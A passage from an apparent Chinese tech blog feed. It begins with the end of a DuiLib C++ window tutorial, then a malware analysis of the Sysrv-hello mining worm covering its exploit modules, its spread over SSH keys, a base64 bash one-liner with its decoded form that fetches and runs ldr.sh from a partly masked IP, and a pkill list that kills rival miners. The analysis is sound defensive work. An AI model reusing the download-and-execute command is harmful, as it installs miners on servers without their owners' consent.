class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// header.h: 标准系统包含文件的包含文件，</span></span><br><span class="line"><span class="comment">// 或特定于项目的包含文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;targetver.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN             <span class="comment">// 从 Windows 头文件中排除极少使用的内容</span></span></span><br><span class="line"><span class="comment">// Windows 头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// C 运行时头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含库头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;UIlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入DuiLib命名空间</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> DuiLib;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，这里我们是64位版本，所以需要x64库目录下的静态库文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;//x64//DuiLib_d.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;//x64//DuiLib.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _DEBUG</span></span></span><br></pre></td></tr></table></figure><h3 id="6-在wWinMain中添加DuiLib相关代码"><a href="#6-在wWinMain中添加DuiLib相关代码" class="headerlink" title="6. 在wWinMain中添加DuiLib相关代码"></a>6. 在wWinMain中添加DuiLib相关代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 程序实例</span></span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetInstance</span>(hInstance);</span><br><span class="line">    <span class="comment">// 配置资源路径</span></span><br><span class="line">    <span class="comment">// 资源类型</span></span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetResourceType</span>(UILIB_FILE);</span><br><span class="line">    <span class="comment">// 资源路径： 执行程序同目录的Skins文件夹下</span></span><br><span class="line">    <span class="comment">// CPaintManagerUI::GetInstancePath() 执行程序目录</span></span><br><span class="line">    CDuiString strResPath;</span><br><span class="line">    strResPath.<span class="built_in">Format</span>(_T(<span class="string">&quot;%sSkins&quot;</span>), CPaintManagerUI::<span class="built_in">GetInstancePath</span>());</span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetResourcePath</span>(strResPath);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 等待创建窗口代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动消息循环</span></span><br><span class="line">    CPaintManagerUI::<span class="built_in">MessageLoop</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-创建MainWnd类，类名可以自定义，基类为WindowImplBase"><a href="#7-创建MainWnd类，类名可以自定义，基类为WindowImplBase" class="headerlink" title="7. 创建MainWnd类，类名可以自定义，基类为WindowImplBase"></a>7. 创建<code>MainWnd</code>类，类名可以自定义，基类为<code>WindowImplBase</code></h3><p>生成后有一句include的代码，将其删除。改为引入<code>framework.h</code><br><img src="/../uploads/2022/08/3961711033.png" alt="2022-08-30T10:18:43.png" title="2022-08-30T10:18:43.png"><br><img src="/../uploads/2022/08/519886070.png" alt="2022-08-30T10:19:42.png" title="2022-08-30T10:19:42.png"></p><h3 id="8-创建构造函数，析构函数，实现父类的纯虚函数。"><a href="#8-创建构造函数，析构函数，实现父类的纯虚函数。" class="headerlink" title="8. 创建构造函数，析构函数，实现父类的纯虚函数。"></a>8. 创建构造函数，析构函数，实现父类的纯虚函数。</h3><p>父类的纯虚函数有如下两个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 返回窗口UI布局文件名</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> CDuiString <span class="title">GetSkinFile</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 返回窗口类名</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> LPCTSTR <span class="title">GetWindowClassName</span><span class="params">(<span class="type">void</span>)</span> <span class="type">const</span> </span>= <span class="number">0</span> ;</span><br></pre></td></tr></table></figure><p>在父类类名处右键，点击快速操作和重构<br><img src="/../uploads/2022/08/4293354973.png" alt="2022-08-31T02:10:24.png" title="2022-08-31T02:10:24.png"><br>点击实现基”WindowImplBase”的纯虚方法<br><img src="/../uploads/2022/08/1552286311.png" alt="2022-08-31T02:10:49.png" title="2022-08-31T02:10:49.png"><br>自动生成的头文件没有使用<code>public</code>修饰，记得自己加上<br><img src="/../uploads/2022/08/966787975.png" alt="2022-08-31T02:12:12.png" title="2022-08-31T02:12:12.png"><br>实现纯虚方法<br><img src="/../uploads/2022/08/4231735467.png" alt="2022-08-31T02:20:53.png" title="2022-08-31T02:20:53.png"></p><h3 id="9-在wWinMain中填写创建窗口代码"><a href="#9-在wWinMain中填写创建窗口代码" class="headerlink" title="9. 在wWinMain中填写创建窗口代码"></a>9. 在wWinMain中填写创建窗口代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DuilibDemo.cpp : 定义应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DuilibDemo.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MainWnd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetInstance</span>(hInstance);</span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetResourceType</span>(UILIB_FILE);</span><br><span class="line">    CDuiString strResPath;</span><br><span class="line">    strResPath.<span class="built_in">Format</span>(_T(<span class="string">&quot;%sSkins&quot;</span>), CPaintManagerUI::<span class="built_in">GetInstancePath</span>().<span class="built_in">GetData</span>());</span><br><span class="line">    CPaintManagerUI::<span class="built_in">SetResourcePath</span>(strResPath);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 等待创建窗口代码</span></span><br><span class="line">    MainWnd* pMainWnd = <span class="keyword">new</span> <span class="built_in">MainWnd</span>();</span><br><span class="line">    <span class="comment">// 创建窗口，设置属性为可见，弹出式窗口。</span></span><br><span class="line">    pMainWnd-&gt;<span class="built_in">Create</span>(<span class="literal">NULL</span>, _T(<span class="string">&quot;DuiLibDemo&quot;</span>), WS_POPUP  WS_VISIBLE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 窗口移动至屏幕中间</span></span><br><span class="line">    pMainWnd-&gt;<span class="built_in">CenterWindow</span>();</span><br><span class="line"></span><br><span class="line">    CPaintManagerUI::<span class="built_in">MessageLoop</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-在Skins目录创建窗口布局文件"><a href="#10-在Skins目录创建窗口布局文件" class="headerlink" title="10. 在Skins目录创建窗口布局文件"></a>10. 在Skins目录创建窗口布局文件</h3><p>右键添加xml文件，在bin目录下<br><img src="/../uploads/2022/08/3873084019.png" alt="2022-08-31T02:26:26.png" title="2022-08-31T02:26:26.png"><br><img src="/../uploads/2022/08/2898369089.png" alt="2022-08-31T02:34:56.png" title="2022-08-31T02:34:56.png"></p><h3 id="11-添加UI筛选器"><a href="#11-添加UI筛选器" class="headerlink" title="11. 添加UI筛选器"></a>11. 添加UI筛选器</h3><p>对UI文件进行归类，将MainWnd.xml在解决方案目录中拖拽到该筛选器中。<br><img src="/../uploads/2022/08/1599877310.png" alt="2022-08-31T02:37:05.png" title="2022-08-31T02:37:05.png"></p><h3 id="12-编写窗口布局代码"><a href="#12-编写窗口布局代码" class="headerlink" title="12. 编写窗口布局代码"></a>12. 编写窗口布局代码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Window</span> <span class="attr">size</span>=<span class="string">&quot;800, 600&quot;</span> <span class="attr">caption</span>=<span class="string">&quot;0,0,0,30&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">VerticalLayout</span> <span class="attr">bkcolor</span>=<span class="string">&quot;#ff888888&quot;</span> <span class="attr">childvalign</span>=<span class="string">&quot;vcenter&quot;</span> <span class="attr">childalign</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> <span class="attr">name</span>=<span class="string">&quot;closebtn&quot;</span> <span class="attr">bkcolor</span>=<span class="string">&quot;#ffff0000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;30&quot;</span> <span class="attr">text</span>=<span class="string">&quot;关闭窗口&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">VerticalLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Window</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="13-运行效果"><a href="#13-运行效果" class="headerlink" title="13. 运行效果"></a>13. 运行效果</h3><p>至此，DuiLib项目已经创建完毕。打包发布的时候只需要将bin目录下的文件打包即可。对于UI布局和资源文件可以使用ZIP方式从资源中加载。如何实现该代码，请看后续文章~<br>文中项目链接: <a href="https://github.com/204065248/DuilibDemo">https://github.com/204065248/DuilibDemo</a><br><img src="/../uploads/2022/08/38451786.png" alt="2022-08-31T02:37:26.png" title="2022-08-31T02:37:26.png"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> DuiLib_Ultimate </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DuiLib </tag>
            
            <tag> DuiLib_Ultimate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sysrv-hello挖矿样本</title>
      <link href="/1b24b67c9282/"/>
      <url>/1b24b67c9282/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><hr><p>该样本为<strong>Sysrv-hello</strong>挖矿样本，目前该病毒家族的漏洞利用模块已达20个。<strong>Sysrv-hello</strong>家族最早出现<br>于2020年12月份，至今其版本迭代已数十次，不断的新增攻击模块，是一个新型且十分活跃的家族。</p><h1 id="挖矿程序的特征"><a href="#挖矿程序的特征" class="headerlink" title="挖矿程序的特征"></a>挖矿程序的特征</h1><hr><ul><li>挖矿程序会占用CPU进行超频运算，导致CPU严重损耗，并且影响服务器上的其他应用。</li><li>挖矿程序还具备蠕虫化特点，当安全边界被突破时，挖矿病毒会向内网渗透，并在被入侵的服务器上持久化驻留以获取最大收益。</li><li>挖矿程序具有联动作用，在清理过程中会存在处理不及时或清理不干净导致挖矿病毒反复发生、出现恶意脚本替换系统命令的现象，从而导致执行系统命令时触发恶意脚本执行（例如：xorddos）。因此，需要在挖矿程序的一个执行周期内，尽快将被入侵服务器上的木马程序和持续化后门清理干净，否则容易导致挖矿病毒频繁复发。</li></ul><h1 id="样本文件信息"><a href="#样本文件信息" class="headerlink" title="样本文件信息"></a>样本文件信息</h1><hr><p>该样本为公司样本，故不提供相关特征。</p><h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><hr><p>该样本使用随机IP对其进行端口扫描，如果端口开放则进行漏洞攻击<br><img src="/../uploads/2022/10/2129311829.png" alt="2022-10-28T10:04:34.png" title="2022-10-28T10:04:34.png"></p><h2 id="漏洞利用模块列表"><a href="#漏洞利用模块列表" class="headerlink" title="漏洞利用模块列表"></a>漏洞利用模块列表</h2><p><img src="/../uploads/2022/10/3368423067.png" alt="2022-10-28T10:04:53.png" title="2022-10-28T10:04:53.png"></p><h3 id="JBOOS反序列化漏洞"><a href="#JBOOS反序列化漏洞" class="headerlink" title="JBOOS反序列化漏洞"></a>JBOOS反序列化漏洞</h3><p><img src="/../uploads/2022/10/296078370.png" alt="2022-10-28T10:05:22.png" title="2022-10-28T10:05:22.png"></p><h3 id="Supervisord远程命令执行漏洞（CVE-2017-11610）利用模块："><a href="#Supervisord远程命令执行漏洞（CVE-2017-11610）利用模块：" class="headerlink" title="Supervisord远程命令执行漏洞（CVE-2017-11610）利用模块："></a>Supervisord远程命令执行漏洞（CVE-2017-11610）利用模块：</h3><p><img src="/../uploads/2022/10/3130749331.png" alt="2022-10-28T10:05:37.png" title="2022-10-28T10:05:37.png"></p><h3 id="Laravel-Debug-mode-RCE（CVE-2021-3129）漏洞利用模块："><a href="#Laravel-Debug-mode-RCE（CVE-2021-3129）漏洞利用模块：" class="headerlink" title="Laravel Debug mode RCE（CVE_2021_3129）漏洞利用模块："></a>Laravel Debug mode RCE（CVE_2021_3129）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/1896113651.png" alt="2022-10-28T10:05:54.png" title="2022-10-28T10:05:54.png"></p><h3 id="Confluence-RCE（CVE-2019-3396）漏洞利用模块："><a href="#Confluence-RCE（CVE-2019-3396）漏洞利用模块：" class="headerlink" title="Confluence RCE（CVE-2019-3396）漏洞利用模块："></a>Confluence RCE（CVE-2019-3396）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/3195257837.png" alt="2022-10-28T10:06:14.png" title="2022-10-28T10:06:14.png"></p><h3 id="Phpunit-RCE（CVE-2017-9841）漏洞利用模块："><a href="#Phpunit-RCE（CVE-2017-9841）漏洞利用模块：" class="headerlink" title="Phpunit RCE（CVE-2017-9841）漏洞利用模块："></a>Phpunit RCE（CVE-2017-9841）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/2597425058.png" alt="2022-10-28T10:06:29.png" title="2022-10-28T10:06:29.png"></p><h3 id="struts2-s2-045-RCE（CVE-2017-5638）漏洞利用模块："><a href="#struts2-s2-045-RCE（CVE-2017-5638）漏洞利用模块：" class="headerlink" title="struts2-s2-045 RCE（CVE-2017-5638）漏洞利用模块："></a>struts2-s2-045 RCE（CVE-2017-5638）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/2391924298.png" alt="2022-10-28T10:06:44.png" title="2022-10-28T10:06:44.png"></p><h3 id="Jenkins-RCE-CVE-2018-1000861漏洞利用模块："><a href="#Jenkins-RCE-CVE-2018-1000861漏洞利用模块：" class="headerlink" title="Jenkins RCE CVE-2018-1000861漏洞利用模块："></a>Jenkins RCE CVE-2018-1000861漏洞利用模块：</h3><p><img src="/../uploads/2022/10/4043337370.png" alt="2022-10-28T10:07:01.png" title="2022-10-28T10:07:01.png"></p><h3 id="Jupyter未授权访问漏洞利用模块："><a href="#Jupyter未授权访问漏洞利用模块：" class="headerlink" title="Jupyter未授权访问漏洞利用模块："></a>Jupyter未授权访问漏洞利用模块：</h3><p><img src="/../uploads/2022/10/412743588.png" alt="2022-10-28T10:07:26.png" title="2022-10-28T10:07:26.png"></p><h3 id="Nexus-Repository-Manager-3-RCE（CVE-2019-7238）漏洞利用模块："><a href="#Nexus-Repository-Manager-3-RCE（CVE-2019-7238）漏洞利用模块：" class="headerlink" title="Nexus Repository Manager 3 RCE（CVE-2019-7238）漏洞利用模块："></a>Nexus Repository Manager 3 RCE（CVE-2019-7238）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/113056053.png" alt="2022-10-28T10:07:46.png" title="2022-10-28T10:07:46.png"></p><h3 id="Tomcat-弱口令爆破模块："><a href="#Tomcat-弱口令爆破模块：" class="headerlink" title="Tomcat 弱口令爆破模块："></a>Tomcat 弱口令爆破模块：</h3><p><img src="/../uploads/2022/10/1694095932.png" alt="2022-10-28T10:08:09.png" title="2022-10-28T10:08:09.png"></p><h3 id="WordPress暴力破解："><a href="#WordPress暴力破解：" class="headerlink" title="WordPress暴力破解："></a>WordPress暴力破解：</h3><p><img src="/../uploads/2022/10/2782400061.png" alt="2022-10-28T10:08:28.png" title="2022-10-28T10:08:28.png"></p><h3 id="XXL-JOB-executor-未授权访问漏洞利用模块："><a href="#XXL-JOB-executor-未授权访问漏洞利用模块：" class="headerlink" title="XXL-JOB executor 未授权访问漏洞利用模块："></a>XXL-JOB executor 未授权访问漏洞利用模块：</h3><p><img src="/../uploads/2022/10/682790523.png" alt="2022-10-28T10:08:46.png" title="2022-10-28T10:08:46.png"></p><h3 id="Hadoop-YARN-REST-API未授权漏洞利用："><a href="#Hadoop-YARN-REST-API未授权漏洞利用：" class="headerlink" title="Hadoop YARN REST API未授权漏洞利用："></a>Hadoop YARN REST API未授权漏洞利用：</h3><p><img src="/../uploads/2022/10/2097868473.png" alt="2022-10-28T10:09:04.png" title="2022-10-28T10:09:04.png"></p><h3 id="ThinkPHP5-RCE漏洞利用模块："><a href="#ThinkPHP5-RCE漏洞利用模块：" class="headerlink" title="ThinkPHP5 RCE漏洞利用模块："></a>ThinkPHP5 RCE漏洞利用模块：</h3><p><img src="/../uploads/2022/10/2532522494.png" alt="2022-10-28T10:09:20.png" title="2022-10-28T10:09:20.png"></p><h3 id="WebLogic-RCE-（CVE-2020-14882）漏洞利用模块："><a href="#WebLogic-RCE-（CVE-2020-14882）漏洞利用模块：" class="headerlink" title="WebLogic RCE （CVE-2020-14882）漏洞利用模块："></a>WebLogic RCE （CVE-2020-14882）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/192829490.png" alt="2022-10-28T10:09:44.png" title="2022-10-28T10:09:44.png"></p><h3 id="Redis未授权写漏洞利用模块："><a href="#Redis未授权写漏洞利用模块：" class="headerlink" title="Redis未授权写漏洞利用模块："></a>Redis未授权写漏洞利用模块：</h3><p><img src="/../uploads/2022/10/1205316592.png" alt="2022-10-28T10:10:04.png" title="2022-10-28T10:10:04.png"></p><h3 id="SSH爆破："><a href="#SSH爆破：" class="headerlink" title="SSH爆破："></a>SSH爆破：</h3><p><img src="/../uploads/2022/10/2541215298.png" alt="2022-10-28T10:10:33.png" title="2022-10-28T10:10:33.png"></p><h3 id="PostgreSQL-RCE（CVE-2019-9193）漏洞利用模块："><a href="#PostgreSQL-RCE（CVE-2019-9193）漏洞利用模块：" class="headerlink" title="PostgreSQL RCE（CVE-2019-9193）漏洞利用模块："></a>PostgreSQL RCE（CVE-2019-9193）漏洞利用模块：</h3><p><img src="/../uploads/2022/10/3554208641.png" alt="2022-10-28T10:10:48.png" title="2022-10-28T10:10:48.png"></p><h3 id="Spring-Cloud-Gateway-Actuator-RCE漏洞（CVE-2022-22947）"><a href="#Spring-Cloud-Gateway-Actuator-RCE漏洞（CVE-2022-22947）" class="headerlink" title="Spring Cloud Gateway Actuator RCE漏洞（CVE-2022-22947）"></a>Spring Cloud Gateway Actuator RCE漏洞（CVE-2022-22947）</h3><p><img src="/../uploads/2022/10/206785698.png" alt="2022-10-28T10:12:19.png" title="2022-10-28T10:12:19.png"></p><h1 id="病毒传播方式"><a href="#病毒传播方式" class="headerlink" title="病毒传播方式"></a>病毒传播方式</h1><p>利用服务器SSH密匙进行横向移动。</p><h2 id="下载恶意主脚本ldr-sh"><a href="#下载恶意主脚本ldr-sh" class="headerlink" title="下载恶意主脚本ldr.sh"></a>下载恶意主脚本ldr.sh</h2><p>横向传播模块sys.x86_64运行后还会执行如下base64编码的shell命令，以下载恶意主脚本ldr.sh，从而<br>实现持久化控制。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -c</span><br><span class="line">&#123;<span class="built_in">echo</span>,KGN1cmwgMTk0LjE0NS4yMjcuMjEvbGRyLnNoP2UzOWRjMnx8Y3VybCAxOTQuMTQ1LjIyNy4yMS</span><br><span class="line">9sZHIuc2g/ZTM5ZGMyfHxjdXJsIC1xxxxxxxxxxxxxxxI3LjIxL2xkci5zaD9lMzlkYzJ8fGN1cmwgLW</span><br><span class="line">sgMTk0LjE0NS4yMjcuxxxxxxxxxxxxxxxxRjMnx8d2dldCAtcSAtTy0gMTk0LjE0NS4yMjcuMjEvbG</span><br><span class="line">RyLnNoP2UzOWRjMil8c2ggMT4vZGV2L251bGwgMj4mMSAm&#125;&#123;<span class="built_in">base64</span>,-d&#125;&#123;bash,-i&#125;t</span><br></pre></td></tr></table></figure><p><strong>解密后内容如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,(curl 194.145.xx.xx/ldr.sh?e39dc2curl 194.145.xx.xx/ldr.sh?</span><br><span class="line">e39dc2curl -k 194.145.xx.xx/ldr.sh?e39dc2curl -k 194.145.xx.xx/ldr.sh?</span><br><span class="line">e39dc2wget -q -O- 194.145.xx.xx/ldr.sh?e39dc2)sh 1&gt;/dev/null 2&gt;&amp;1 &amp;&#125;</span><br></pre></td></tr></table></figure><h3 id="主要功能为如下几点："><a href="#主要功能为如下几点：" class="headerlink" title="主要功能为如下几点："></a>主要功能为如下几点：</h3><p>1、关闭防火墙<br><img src="/../uploads/2022/10/2194322662.png" alt="2022-10-28T10:13:55.png" title="2022-10-28T10:13:55.png"><br>2、结束下列进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">pkill -9 -f b64decode</span><br><span class="line">pkill -9 -f MCf8</span><br><span class="line">pkill -9 -f mysqldd</span><br><span class="line">pkill -9 -f monero</span><br><span class="line">pkill -9 -f kinsing</span><br><span class="line">pkill -9 -f sshpass</span><br><span class="line">pkill -9 -f sshexec</span><br><span class="line">pkill -9 -f cnrig</span><br><span class="line">pkill -9 -f attack</span><br><span class="line">pkill -9 -f dovecat</span><br><span class="line">pkill -9 -f javae</span><br><span class="line">pkill -9 -f donate</span><br><span class="line">pkill -9 -f <span class="string">&#x27;scan\.log&#x27;</span></span><br><span class="line">pkill -9 -f xmr-stak</span><br><span class="line">pkill -9 -f crond64</span><br><span class="line">pkill -9 -f stratum</span><br><span class="line">pkill -9 -f /tmp/java</span><br><span class="line">pkill -9 -f pastebin</span><br><span class="line">pkill -9 -f <span class="string">&#x27;/tmp/\.&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;so\.txt&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;bash -s 3673&#x27;</span></span><br><span class="line">pkill -9 -f 8005/cc5</span><br><span class="line">pkill -9 -f /tmp/system</span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./cliented&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\.inis&#x27;</span></span><br><span class="line">pkill -9 -f certutil</span><br><span class="line">pkill -9 -f excludefile</span><br><span class="line">pkill -9 -f agettyd</span><br><span class="line">pkill -9 -f kthreaddkk</span><br><span class="line">pkill -9 -f /dev/shm</span><br><span class="line">pkill -9 -f /var/tmp</span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./python&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./crun&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;bash -s kthreaddk&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./\.&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;118/cf\.sh&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./lin64&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;confluence/install\.sh&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;unls64\.sh&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./system-xfwm4-session&#x27;</span></span><br><span class="line">pkill -9 -f <span class="string">&#x27;\./httpd&#x27;</span></span><br><span class="line">pkill -9 -f xmrig</span><br><span class="line">pkill -9 -f kthreaddi</span><br><span class="line">pkill -9 -f loligang</span><br><span class="line">pkill -9 <span class="string">&#x27;\.6379&#x27;</span></span><br><span class="line">pkill -9 <span class="string">&#x27;load\.sh&#x27;</span></span><br><span class="line">pkill -9 <span class="string">&#x27;init\.sh&#x27;</span></span><br><span class="line">pkill -9 